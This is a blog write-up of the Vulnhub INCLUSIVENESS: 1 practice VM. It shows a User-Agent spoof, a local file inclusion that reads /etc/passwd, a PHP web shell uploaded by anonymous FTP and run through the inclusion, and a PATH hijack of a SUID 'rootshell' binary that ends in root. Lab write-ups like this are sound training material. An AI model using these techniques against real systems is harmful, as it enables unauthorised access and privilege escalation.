---
layout: post
title:  "Vulnhub: INCLUSIVENESS: 1"
date:   2021-01-27 21:00:00 +1100
category: hacking
---

## Sustah
*Inclusiveness is an intermediate boot to root VM to practice your hacking skills. Can you get in?*

This is [INCLUSIVENESS: 1](https://www.vulnhub.com/entry/inclusiveness-1,422/) from Vulnhub. The creator described it as intermediate. Let's go.

## Ports
FTP, SSH and HTTP.

## FTP
Anonymous login with upload enabled, what's not to love? Doesn't help yet ... but it will (ooooh, foreshadowing).

## HTTP
The frontpage is just the Apache2 default page. Nothing much shows up, even with a big wordlist using *dirsearch*. We do get one interesting message though when trying to access *robots.txt*:

>You are not a search engine! You can't read my robots.txt! 

### User-Agent
So I'm not a search engine eh? What if I was?

``
User-Agent: Googlebot/2.1
``

Now I get this:

>User-agent: *  
Disallow: /secret_information/

Cool. What's that? Some text about DNS zone transfers. But we don't have a DNS port open, so it's not what we want. We do have two language options:

>http://192.168.1.179/secret_information/?lang=en.php

How's about LFI?

``
GET /secret_information/?lang=../../../../../../../../etc/passwd HTTP/1.1
``

Ding ding ding, we have a winner!

## Shell
So we've got the ability to upload files, and a way to include them. Can you say shell?

``
root@kali:/run/user/0/gvfs/ftp:host=inclusiveness/pub# cp /opt/vulnhub/inclusiveness/shell.php shell.php
``

and then

``
http://192.168.1.179/secret_information/?lang=../../../../../../../../var/ftp/pub/shell.php
``

Bingo. I did also check:

``
GET /secret_information/?lang=../../../../../../../../etc/vsftpd.conf HTTP/1.1
``

to see where the upload directory was. I checked for SSH keys and log poisoning before I uploaded the shell.

## Privesc
We've got one user, *tom*. He has a rootshell SUID binary, with the source code:

{% highlight c %}
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
        setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
{% endhighlight %}

Linpeas is having none of this:

{% highlight shell %}
-rwsr-xr-x 1 root root        17K Feb  8  2020 /home/tom/rootshell
  --- It looks like /home/tom/rootshell is executing whoami and you can impersonate it (strings line: whoami)
{% endhighlight %}

Savage. Let's give it a go:

{% highlight shell %}
www-data@inclusiveness:/home/tom$ cd /dev/shm
cd /dev/shm
www-data@inclusiveness:/dev/shm$ printf '#!/bin/bash\n' >> whoami
printf '#!/bin/bash\n' >> whoami
www-data@inclusiveness:/dev/shm$ printf 'echo tom\n' >> whoami
printf 'echo tom\n' >> whoami
www-data@inclusiveness:/dev/shm$ chmod +x whoami
chmod +x whoami
www-data@inclusiveness:/dev/shm$ export PATH=/dev/shm:$PATH
export PATH=/dev/shm:$PATH
www-data@inclusiveness:/dev/shm$ /home/tom/rootshell
/home/tom/rootshell
checking if you are tom...
you are: tom

access granted.
# id;hostname
id;hostname
uid=0(root) gid=33(www-data) groups=33(www-data)
inclusiveness
{% endhighlight %}

And that was that.

